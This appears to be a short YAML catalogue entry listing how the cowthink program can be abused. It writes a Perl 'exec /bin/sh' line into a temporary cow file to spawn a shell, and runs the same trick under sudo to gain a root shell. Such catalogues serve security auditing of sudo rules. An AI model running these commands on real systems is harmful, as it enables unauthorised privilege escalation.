functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'exec "/bin/sh";' >$TF
        cowthink -f $TF x
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'exec "/bin/sh";' >$TF
        sudo cowthink -f $TF x
---